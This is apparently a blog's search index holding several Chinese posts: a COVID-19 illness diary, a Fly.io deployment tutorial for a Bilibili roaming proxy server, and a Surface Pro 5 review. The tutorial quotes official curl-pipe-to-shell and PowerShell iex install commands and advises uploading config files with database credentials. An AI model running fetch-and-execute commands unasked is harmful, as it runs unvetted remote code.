<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>与新冠肺炎搏斗的那些日子</title>
      <link href="/posts/Fight-against-COVID19/"/>
      <url>/posts/Fight-against-COVID19/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>2022年12月18日下午，我感到十分地不适，在那之前，我们学院里有出现过COVID19（新冠肺炎）病例，所以整个学院都是在疫情管控状态，当我感受到我不适的那一刻我就知道，我很有可能是中招了。我第一次测量体温是37.4（刚刚过发烧线37.3），然后就把我丢到了临时的隔离房间去隔离去，说观察一个晚上再决定是否把我拉去隔离。</p><p>2022年12月18日晚，最后一次测量体温是38.1，此时的感觉是喉咙非常地干（话说这个自早上就是这样的了），而且四肢无力，特别是之前动过手术的左腿膝盖那个位置，很酸痛。</p><p>我就是带着各种不适的感觉睡了觉，期间起了三次，分别是十一点半、两点和四点</p><p>2022年12月19日，早上第一次测量体温，体温飙到了38.3度，这个被拉去隔离没跑了，早上四节课睡了两节课，中午就通知说去统一隔离点隔离，等中午过来以后第一次测了个体温，38.4，感觉头痛、四肢无力、喉咙干、有点流鼻涕、怕冷，来到隔离房间先倒头一睡，下午上课其实也心不在焉。等到了五点钟再测一次体温，好家伙直接给我干到了38.9度，稍微躺了躺感觉好了点，七点钟再测一次，体温下滑到了37.3度，虽然还是发烧，但是没那么严重了，症状轻了一些（当然也有可能是打了一下午COD的结果）</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 待更新 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Fly.io平台部署哔哩漫游服务器</title>
      <link href="/posts/Deploy-biliroaming-go-server-with-flyio/"/>
      <url>/posts/Deploy-biliroaming-go-server-with-flyio/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>做这个是因为之前 @wuki 问我说能不能用<a href="https://fly.io/">Deploy app servers close to your users · Fly</a>这个平台弄哔哩漫游服务器，然后借了我一个号，结果陆陆续续总共拖了将近半年才弄出来，在这留个记录。</p><div class="note warning flat"><p>请注意：fly.io平台免费账户需要信用卡验证后才能够部署项目！</p></div><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Deploy-biliroaming-go-server-with-flyio/msedge_EB3k3IEoNv.png"></p><hr><p>这里我们使用的项目是<a href="https://github.com/JasonKhew96/biliroaming-go-server">JasonKhew96&#x2F;biliroaming-go-server (github.com)</a></p><p>根据fly.io官方的文档，有以下地区可选（<a href="https://fly.io/docs/reference/regions/#fly-io-regions">Regions · Fly Docs</a>）</p><table><thead><tr><th>Region ID</th><th>Region Location</th><th>Gateway*</th></tr></thead><tbody><tr><td>ams</td><td>Amsterdam, Netherlands</td><td>✓</td></tr><tr><td>cdg</td><td>Paris, France</td><td>✓</td></tr><tr><td>den</td><td>Denver, Colorado (US)</td><td>✓</td></tr><tr><td>dfw</td><td>Dallas, Texas (US)</td><td>✓</td></tr><tr><td>ewr</td><td>Secaucus, NJ (US)</td><td></td></tr><tr><td>fra</td><td>Frankfurt, Germany</td><td>✓</td></tr><tr><td>gru</td><td>São Paulo</td><td></td></tr><tr><td><strong>hkg</strong></td><td><strong>Hong Kong, Hong Kong</strong></td><td><strong>✓</strong></td></tr><tr><td>iad</td><td>Ashburn, Virginia (US)</td><td></td></tr><tr><td>jnb</td><td>Johannesburg, South Africa</td><td></td></tr><tr><td>lax</td><td>Los Angeles, California (US)</td><td>✓</td></tr><tr><td>lhr</td><td>London, United Kingdom</td><td>✓</td></tr><tr><td>maa</td><td>Chennai (Madras), India</td><td>✓</td></tr><tr><td>mad</td><td>Madrid, Spain</td><td></td></tr><tr><td>mia</td><td>Miami, Florida (US)</td><td></td></tr><tr><td>nrt</td><td>Tokyo, Japan</td><td>✓</td></tr><tr><td>ord</td><td>Chicago, Illinois (US)</td><td>✓</td></tr><tr><td>otp</td><td>Bucharest, Romania</td><td></td></tr><tr><td>scl</td><td>Santiago, Chile</td><td>✓</td></tr><tr><td>sea</td><td>Seattle, Washington (US)</td><td>✓</td></tr><tr><td>sin</td><td>Singapore</td><td>✓</td></tr><tr><td>sjc</td><td>Sunnyvale, California (US)</td><td>✓</td></tr><tr><td>syd</td><td>Sydney, Australia</td><td>✓</td></tr><tr><td>waw</td><td>Warsaw, Poland</td><td></td></tr><tr><td>yul</td><td>Montreal, Canada</td><td></td></tr><tr><td>yyz</td><td>Toronto, Canada</td><td>✓</td></tr></tbody></table><p>在这里我们选择的就是香港地区(hkg)，在部署中，它的cli是把当前目录下的文件打包为docker镜像上传到它的镜像库中再进行部署的</p><h3 id="安装CLI"><a href="#安装CLI" class="headerlink" title="安装CLI"></a>安装CLI</h3><p>官网提供的安装方式如下</p><h4 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h4><p>If you have the <a href="https://brew.sh/">Homebrew</a> package manager installed, flyctl can be installed by running:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install flyctl</span><br></pre></td></tr></table></figure><p>If not, you can run the install script:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://fly.io/install.sh | sh</span><br></pre></td></tr></table></figure><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>Run the install script:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://fly.io/install.sh | sh</span><br></pre></td></tr></table></figure><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>Run the Powershell install script:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">iwr</span> https://fly.io/install.ps1 <span class="literal">-useb</span> | <span class="built_in">iex</span></span><br></pre></td></tr></table></figure><p>但是因为我的网络太小霸王了，所以我用了Github的Codespaces来作为中介去干这个</p><h4 id="使用Github-Codespaces"><a href="#使用Github-Codespaces" class="headerlink" title="使用Github Codespaces"></a>使用Github Codespaces</h4><p>在这个绿绿的<code>Code</code>按钮里面点到Codespaces，然后创建一个（我这里创建过了所以有一个）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Deploy-biliroaming-go-server-with-flyio/msedge_blfgaVum2p.png"></p><p>直接打开，可以在网页打开，也可以接入自己的Vscode，进入以后按快捷键<kbd>Ctrl</kbd> + <kbd>L-Shift</kbd> + <kbd>`</kbd>打开一个终端，并把安装<code>flyctl</code>的命令写进去</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Deploy-biliroaming-go-server-with-flyio/Code_IPvqowlcdn.png"></p><p>这样就是安装完毕了，估计是Codespaces的机制问题，所以需要通过绝对路径去访问它</p><p>输入一下命令来登录（这里我就不打绝对路径了，这里假设是用本地电脑且<code>flyctl</code>已经加入环境变量）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">flyctl auth login</span></span><br></pre></td></tr></table></figure><p>然后终端会显示一个链接，如果你跟我一样用的是Codespaces，那就把这个链接放到自己的浏览器里面去访问登录就行了，如果你是本地运行，应该会自动打开登录页面（没截图，登录应该是小问题）</p><h3 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h3><p>首先打开<code>.gitignore</code>文件和<code>.dockerignore</code>文件（如果有的话），把里面的内容全部删掉，因为部署的时候我们是需要把配置文件给一起上传的，而<code>.gitignore</code>把这些文件都排除掉了，所以要删掉里面的所有内容</p><p>再打开<code>fly.toml</code>，在最底下加上这些内容</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[build.args]</span></span><br><span class="line">  <span class="attr">BP_KEEP_FILES</span> = <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure><p>不这么做的后果↓</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">2022-12-19T10:02:56.427 runner[86dbcaaa] hkg [info] Starting instance</span><br><span class="line">2022-12-19T10:02:58.492 runner[86dbcaaa] hkg [info] Configuring virtual machine</span><br><span class="line">2022-12-19T10:02:58.494 runner[86dbcaaa] hkg [info] Pulling container image</span><br><span class="line">2022-12-19T10:02:59.436 runner[86dbcaaa] hkg [info] Unpacking image</span><br><span class="line">2022-12-19T10:02:59.450 runner[86dbcaaa] hkg [info] Preparing kernel init</span><br><span class="line">2022-12-19T10:02:59.946 runner[86dbcaaa] hkg [info] Configuring firecracker</span><br><span class="line">2022-12-19T10:03:00.411 runner[86dbcaaa] hkg [info] Starting virtual machine</span><br><span class="line">2022-12-19T10:03:00.671 app[86dbcaaa] hkg [info] Starting init (commit: f447594)...</span><br><span class="line">2022-12-19T10:03:00.700 app[86dbcaaa] hkg [info] Preparing to run: `/cnb/process/biliroaming-go-server` as 1000</span><br><span class="line">2022-12-19T10:03:00.723 app[86dbcaaa] hkg [info] 2022/12/19 10:03:00 listening on [fdaa:0:6690:a7b:7f07:86db:caaa:2]:22 (DNS: [fdaa::3]:53)</span><br><span class="line">2022-12-19T10:03:00.816 app[86dbcaaa] hkg [info] 2022/12/19 10:03:00 stat ./config.yml: no such file or directory</span><br><span class="line">2022-12-19T10:03:01.705 app[86dbcaaa] hkg [info] Starting clean up.</span><br></pre></td></tr></table></figure><p>接着我们把<code>Dockerfile</code>删掉，因为如果有这个文件的话，<code>flyctl</code>会把这个判定为docker项目，这样的话我们就很难把配置文件丢进去，所以我们要更改它的判定，将判定改为<code>go</code>项目，所以要删掉这个</p><p>然后运行以下命令来初始化，跟着它的提示进行就行，只是最后问我们要不要部署，我们先选择不部署，因为我们接下来要导入数据库（记得把弹出来的数据库连接信息记住，因为它只会展示一次，然后就找不到啦）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Deploy-biliroaming-go-server-with-flyio/Code_j3ENjuAEAf.png">接着我们修改一下项目的端口，将<code>config.example.yml</code>复制一份，为<code>config.yml</code>找到<code>port</code>，把后面的数字改为<code>8080</code></p><p>接着我们打开<code>config.yml</code>修改数据库配置，找到以下内容，注释掉<code>passwordFile</code>，然后修改配置为我们前面创建数据库时给的内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据库</span></span><br><span class="line"><span class="attr">postgreSQL:</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">&quot;&lt;app_name&gt;-db.internal&quot;</span></span><br><span class="line">  <span class="attr">user:</span> <span class="string">&quot;postgres&quot;</span></span><br><span class="line">  <span class="attr">password:</span> <span class="string">&#x27;password&#x27;</span></span><br><span class="line">  <span class="comment">#passwordFile: &quot;/run/secrets/db-password&quot;</span></span><br><span class="line">  <span class="attr">dbName:</span> <span class="string">&quot;&lt;db&gt;&quot;</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">5432</span></span><br></pre></td></tr></table></figure><h3 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h3><p>fly.io的创建的数据库进行连接的时候是使用内部域名进行连接的（格式大概是<code>&lt;app_name&gt;-db.internal</code>，所以我们不能够通过正常的方式进行连接。所幸，<code>flyctl</code>里面可以把数据库给映射到本地</p><p>使用以下命令进行映射</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">flyctl proxy 5432 -a &lt;db_name&gt;</span></span><br></pre></td></tr></table></figure><p>这里我就使用下面这个命令进行连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">flyctl proxy 5432:5432 -a biliroaming-tutorial-db</span></span><br></pre></td></tr></table></figure><p>显示如下内容的时候就是可以进行连接了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Proxying local port 5432 to remote [biliroaming-tutorial-db.internal]:5432</span><br></pre></td></tr></table></figure><p>codespaces还可以在<code>PORTS</code>选项卡里看到绑定的本地端口</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Deploy-biliroaming-go-server-with-flyio/Code_cKM3RAPklr.png"></p><p>这里使用navicat进行连接，在测试之前一定要确保信息填对了</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Deploy-biliroaming-go-server-with-flyio/navicat_pBpgBHRGhZ.png"></p><p>连接以后，我们在左侧可以看到两个数据库，一个是<code>postgres</code>，一个是<code>&lt;app_name&gt;</code>用哪个随便，不过如果要用<code>&lt;app_name&gt;</code>那个，就需要在配置文件里面相应地改掉（一会讲）</p><p>右键自己需要使用的数据库，选择<code>Execute SQL File</code>（执行SQL脚本，我这里是英文版），然后逐个将项目的sql文件夹内的脚本执行，构建数据库结构</p><h3 id="部署项目"><a href="#部署项目" class="headerlink" title="部署项目"></a>部署项目</h3><p>使用以下命令来部署项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">flyctl deploy</span></span><br></pre></td></tr></table></figure><p>如果在部署过程中遇到了下面这个问题（用codespaces就出现了，不过这个好像是它服务器的部署器的问题而不是我codespaces的问题）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error failed to fetch an image or build from source: downloading buildpack: extracting from registry gcr.io/paketo-buildpacks/go: fetching image: error pulling image configuration: error parsing HTTP 403 response body: invalid character &#x27;&lt;&#x27; looking for beginning of value: &quot;&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;&lt;Error&gt;&lt;Code&gt;AccessDenied&lt;/Code&gt;&lt;Message&gt;Access denied.&lt;/Message&gt;&lt;Details&gt;We&#x27;re sorry, but this service is not available in your location&lt;/Details&gt;&lt;/Error&gt;&quot;</span><br></pre></td></tr></table></figure><p>那就要加多个<code>--local-only</code>参数，变成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">flyctl deploy --local-only</span></span><br></pre></td></tr></table></figure><p>当你的fly.io项目的<code>monitor</code>里面显示如下就是部署成功了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2022-12-19T10:35:04.789 runner[fa79ac75] hkg [info] Starting instance</span><br><span class="line">2022-12-19T10:35:07.119 runner[fa79ac75] hkg [info] Configuring virtual machine</span><br><span class="line">2022-12-19T10:35:07.121 runner[fa79ac75] hkg [info] Pulling container image</span><br><span class="line">2022-12-19T10:35:14.098 runner[fa79ac75] hkg [info] Unpacking image</span><br><span class="line">2022-12-19T10:35:15.511 runner[fa79ac75] hkg [info] Preparing kernel init</span><br><span class="line">2022-12-19T10:35:15.926 runner[fa79ac75] hkg [info] Configuring firecracker</span><br><span class="line">2022-12-19T10:35:16.157 runner[fa79ac75] hkg [info] Starting virtual machine</span><br><span class="line">2022-12-19T10:35:16.547 app[fa79ac75] hkg [info] Starting init (commit: f447594)...</span><br><span class="line">2022-12-19T10:35:16.591 app[fa79ac75] hkg [info] Preparing to run: `/cnb/process/biliroaming-go-server` as 1000</span><br><span class="line">......</span><br><span class="line">2022-12-19T10:35:17.834 app[fa79ac75] hkg [info] DELETE FROM &quot;th_subtitle_caches&quot; WHERE (&quot;th_subtitle_caches&quot;.&quot;updated_at&quot; &lt;= $1);</span><br><span class="line">2022-12-19T10:35:17.834 app[fa79ac75] hkg [info] [2022-12-19 10:20:17.834077308 +0000 UTC]</span><br><span class="line">2022-12-19T10:35:17.835 app[fa79ac75] hkg [info] 2022-12-19T10:35:17.835Z DEBUG biliroaming-go-server/main.go:124 Cleanup 0 TH subtitle cache</span><br></pre></td></tr></table></figure><h3 id="获取ipv4地址"><a href="#获取ipv4地址" class="headerlink" title="获取ipv4地址"></a>获取ipv4地址</h3><p>因为fly.io默认只分配了ipv6地址，然而ipv6还没有普及，我们还是需要ipv4的</p><p>使用以下命令来为项目获取ipv4地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">flyctl ips allocate-v4 -a &lt;app_name&gt;</span></span><br></pre></td></tr></table></figure><p>会显示获取到的IP地址等信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VERSION IP              TYPE    REGION  CREATED AT </span><br><span class="line">v4      149.248.221.246 public  global  7s ago    </span><br></pre></td></tr></table></figure><h3 id="已知的bug"><a href="#已知的bug" class="headerlink" title="已知的bug"></a>已知的bug</h3><h4 id="显示“账号未登录”"><a href="#显示“账号未登录”" class="headerlink" title="显示“账号未登录”"></a>显示“账号未登录”</h4><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Deploy-biliroaming-go-server-with-flyio/QQ%E5%9B%BE%E7%89%8720221219181007.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>就决定是你啦！苏菲婆5！ —— 谈谈我对Surface Pro 5的使用体验以及各种骚操作</title>
      <link href="/posts/Enchance-my-Surface-Pro-5/"/>
      <url>/posts/Enchance-my-Surface-Pro-5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>今年的九月份，我卖掉了我的老联想 Yoga 370，然后购置了一台Surface Pro 5顶配版给我自己用</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/2fb3646c58c445c79e0439dd5eb0670.jpg"></p><p>起初是想当做笔记本用的（因为可以用笔），后来才发现有很多的用途</p><p>本文旨在记录我在Surface Pro 5上面的各种骚操作，以及我的个人使用体验，告诉你为什么在<code>2202</code>年，我还要选择一台仅仅配置是7代i7的微软亲儿子Surface Pro 5</p><p>先上两张实物图（背膜是拿图片找某宝做的）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/18325c20e17b5cb63ea4c9c56ebd9f0.jpg"></p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/379d60dc4b2e0e6e78fe593ec38a69d.jpg"></p><hr><h2 id="购买"><a href="#购买" class="headerlink" title="购买"></a>购买</h2><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/SP5-Buying.png"></p><p>很简单，鱼子上面一搜，就有很多，我找的是个人使用的那种（其实鱼子上面很轻易能看出谁是二道贩子，谁是个人卖家），卖家跟我说电池有点问题，其他没啥问题。我想都17年还是18年的产品了，电池有点问题也是正常的事情，然后就一拍即合，拍下了这台苏菲Pro 5</p><p>等我拿到手以后，我发现事情没有那么简单，确实是电池有问题，但是这个电量显示完全不准，有可能我还在办公，电池剩下50%左右的电量就直接给我关机了，等我怎么按下开机键也没用，接上电源后才发现是没电了。</p><p>于是我在某宝上一搜，果然有换电池的，价格在280~450不等，我想这个价格也算是合理，毕竟苏菲这东西集成度太高了，拆的也难。于是我找了一家标价是280的，然后把机子寄了过去换电池。</p><p>某天晚上自习课刚下课，突然我的OPPO Watch接到一通电话，一听才知道是某宝维修商，他说我的电脑不仅是电池有问题，主板还漏电，对钱比较敏感的我问了一句修这个花多少钱，总之最后价格讲下来就是460</p><p>拿到修好的苏菲，我就开始了我的捣鼓之旅。</p><h2 id="Windows（Windows11）体验"><a href="#Windows（Windows11）体验" class="headerlink" title="Windows（Windows11）体验"></a>Windows（Windows11）体验</h2><p>既然是微软亲儿子，那Windows的体验是少不了的，我这台装的是Windows 11 Professional（专业版）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/f542d3b70fce1c4d34cd12f92f319cc.jpg"></p><p>既然Surface是一个笔记本（真笔记本，不是电脑层面的笔记本），那肯定得走一波手写笔的体验</p><p>我用了巨硬自带的OneNote for Windows 10（没错Win11还用的是Win10的），这个东西在我弄数学建模竞赛的时候发挥了非常大的作用</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/onenote.png"></p><p>而且Onenote有个好处，如果你在其他机器上登陆同一个Onenote账户，可以直接同步（下面这个是我游戏本上的截图）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/ApplicationFrameHost-20221203-102324.png"></p><p>当然，因为Surface独有的触屏体验，还可以玩Osu（虽然以前那台LENOVO也可以点着玩）【忘截屏了】</p><p>还可以拿来推GALGAME（没下完，就截个Steam意思意思吧），但是拿来打CSGO那就是小霸王了（一帧能玩，两帧流畅，三帧电竞）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/3087f169d2307bf4e84234493cce8a5.jpg"></p><p>这个3:2的屏幕，写代码也是杠杠的（图为弄数模的时候的数据处理）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/c480e84bb4db912e899db93c1c31a73.png"></p><p>还可以顺带玩一玩SDVX（民间版本，不外传，因为禁用了键盘所以是拍的）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/SDVX.jpg"></p><p>再加上Win11对触屏本身的BUFF加持，让苏菲变得比某希沃好用多了</p><h2 id="Linux（Ubuntu）体验【略】"><a href="#Linux（Ubuntu）体验【略】" class="headerlink" title="Linux（Ubuntu）体验【略】"></a>Linux（Ubuntu）体验【略】</h2><blockquote><p>因为我用Ubuntu的时候没截屏过，然后输入法配置问题把我搞得心态崩了直接把Ubuntu删了，所以这一届没有图片</p></blockquote><p>总的来说是还可以，但是要经过一番配置才可以，你需要安装一个Kernel才能解锁Surface的全部功能（包括触屏等）</p><p>使用的项目是这个<a href="https://github.com/linux-surface/linux-surface">https://github.com/linux-surface/linux-surface</a></p><p>安装方法见<a href="https://github.com/linux-surface/linux-surface/wiki/Installation-and-Setup#debian--ubuntu">Installation and Setup · linux-surface&#x2F;linux-surface Wiki (github.com)</a></p><h2 id="FydeOS（ChromeOS衍生版）体验"><a href="#FydeOS（ChromeOS衍生版）体验" class="headerlink" title="FydeOS（ChromeOS衍生版）体验"></a>FydeOS（ChromeOS衍生版）体验</h2><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/46f340eb313ca2fcac7f1bbfc79d631.jpg" alt="装了FydeOS的Surface Pro 5"></p><p>为啥我会选择装ChromeOS？这个要从一个想法说起。本来我就是个音游玩家，一直在用手机玩音游，没怎么用过平板来玩（以前嫖过别人的平板不过那也是别人的），平板玩音游的优势很大，主要还是屏幕大。我一开始选的是<a href="https://blissos.org/">Bliss OS For PC</a>，这个里面是个Android x86系统，但我不知道是苏菲特色还是咋地，不管是BlissOS 11、BlissOS 14 还是 BlissOS 15（如果过不了那个<code>logcat</code>可以F12里面直接找下载链接，这里放一个 -&gt; <a href="https://sourceforge.net/projects/blissos-dev/files/Android-Generic/PC/bliss/S/foss/alpha/Bliss-v15.0-Alpha-android_x86_64-OFFICIAL-foss-202112151838-nb-sd-ksu-gearlock-ex_vt-console_all-mesa-drivers-crocus.iso/download">BlissOS 15 with Gearlock</a>）装在我的Surface上就一直起不来（进不了系统，有的卡在grub，有的卡在kernel load，有的直接重启），所以我就只能另辟蹊径</p><p>我想起之前用过的FydeOS，但是用的是以前的那个联想装的，还很不成熟，只能在U盘里面使用，装东西也只能装在那个里面，所以当时就放弃了。时隔一年，我又再次下载下来发现已经跟之前很不一样了，现在可以安装在硬盘里面了（安装过程省略，才不是我没有截图呢），安装的时候如果你要保留Windows，记得让安装程序帮你配置rEFInd，要不然会很麻烦</p><p>开机后直接就是一张壁纸，下面是任务栏（启动器）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/ff5d83746ddc8027ef0036cc1b2b861.jpg"></p><p>从下往上滑，打开应用列表，有个非常显眼的东西：安卓设置，点开以后会有个EULA，同意了就可以打开安卓子系统了（其实是Arc - Android Runtime on ChromeOS）</p><p>打开Android子系统后，可以在关于里面看到是Android 9（原生的）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/04f0e3d13686f5416c86c8c8452c65f.jpg"></p><p>用我们的常规手段打开开发者选项后，就可以打开adb调试了，然后可以在ChromeOS的Linux开发者容器里面用adb连接</p><p>你还可以在FydeOS的应用商店里面找到<code>配置 OpenGapps</code>这个应用，打开它，我们就可以安装GAPPS套件了</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/81476986829b981b0c917e76117821f.jpg"></p><p>你可以预先下好Clash啥的软件，方便后续使用</p><p>关于VPN服务，真的要点个赞，当你在Android子系统中使用VPN服务时，FydeOS会自动将VPN应用于整个OS里面，也就是说当我打开Clash的时候，不仅仅是Android子系统的软件可以走代理，FydeOS的Chromium也上了代理，不用再在Linux容器里面装多个v2rayL啥的东西了</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/5b86e24ec0575dbc025142f0bab7156.jpg"></p><p>接着就是装一堆音游啦！既然有了Google Play商店，我就从Play商店里面下载（Cytus2本来在B站下的，因为给B站充钱了，但是在这上面会闪退而Play版就不会，辣鸡龙渊能不能让我转国际区……）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/854beefba9f44be923cdc9a45b51fa2.jpg"></p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/7844f17608ee430106f9a5881658c3b.jpg"></p><p>在这个上面玩音游的体验不能算是优秀，只能算是中规中矩，有些音游在上面玩的有点卡（例如阿卡伊，当然不排除我真的不会玩阿卡伊），华为玩音游有的现象在这上面基本都有（指吃音）</p><p>不过这个系统的Android和ChromeOS之间几乎没有隔阂，这个体现在分享上面，你可以直接分享到Android的应用中</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Enchance-my-Surface-Pro-5/share-on-fydeos.jpg"></p><p>我还在这上面装了崩崩崩、PCR（多聚酶链式反应）、FGO（非酋系列）、明日方舟这几个游戏，本来装了原的，但是原的体验并不好，跟在我的红米NOTE 11上面打感觉没什么两样，就删掉了</p><p>不过这个Android有一个缺点：不能root，我正在寻找root的方式不过这肯定要很久，或许我会找不到。本来我想试试在Windows下用DiskGenius把boot.img直接提取出来修补的，但是FydeOS的目录结构非常奇怪，我是真的没有找到，慢慢来吧……</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Surface Pro 5毕竟是一台几年前的本子了，论性能肯定比不上现在的电脑，但是它带给我的使用体验是非常棒的，比我之前那台YOGA要好得多（轻薄、便携），而且3:2的屏幕确实适合工作（这里表扬一下拯救者系列，我的戴尔游侠就是16:9），可能缺点就是在性能上，还有就是Linux的适配上面了。该说不愧是微软亲儿子嘛，微软做工确实牛</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>移动你的WSA数据盘，让你的C盘不再爆满</title>
      <link href="/posts/Move-your-wsa-data/"/>
      <url>/posts/Move-your-wsa-data/</url>
      
